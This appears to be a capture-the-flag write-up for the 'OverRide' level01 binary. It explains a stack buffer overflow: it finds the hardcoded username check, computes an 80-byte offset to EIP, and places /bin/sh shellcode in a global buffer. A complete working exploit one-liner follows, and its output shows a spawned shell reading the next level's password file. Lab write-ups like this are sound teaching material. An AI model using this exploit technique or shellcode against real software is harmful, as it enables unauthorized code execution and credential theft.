# level01
The program waits for 2 user inputs, a login and a password, the login gets stored in a global variable, a_user_name:

(gdb) info variables
All defined variables:

Non-debugging symbols:
[...]
0x0804a040  a_user_name

The password gets stored in a stack-allocated buffer.

When we disassemble the 2 functions `verify_user_name` and `verify_user_pass` we find that the user inputs get compared to "dat_wil" and "admin", respectively.

We can overflow the stack-allocated buffer to execute our shellcode, using a pattern generator, we find the offset required to overwrite eip is 80.
We'll want to store our shellcode in the global buffer, it makes it so that we don't have to deal with changes in addresses.

To get access to the stack buffer, we'll have to pass the strncmp, that means we'll want to prepend "dat_wil" to our global variable.


gdb ./level01
(gdb) b *0x080485af
(gdb) r

dat_wil
01234567890123456789012345678901234567890123456789012345678901234567890123456789BBBB

(gdb) c
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()


Our input will be as follow
bytes 0-6: "dat_wil", to pass the `verify_user_name` function.
bytes 7-31: Our 24 bytes shellcode
bytes 31: '\n', so that the first fgets stops taking user input
bytes 32-112: Filler bytes, 80 of them to overwrite eip with the next 4 bytes.
bytes 112-116: The address of the global variable taken above + 7, to ignore the "dat_wil" that we first inputed


level01@OverRide:~$ cat <(python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x08\x04\xa0\x47'[::-1]")  - | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv









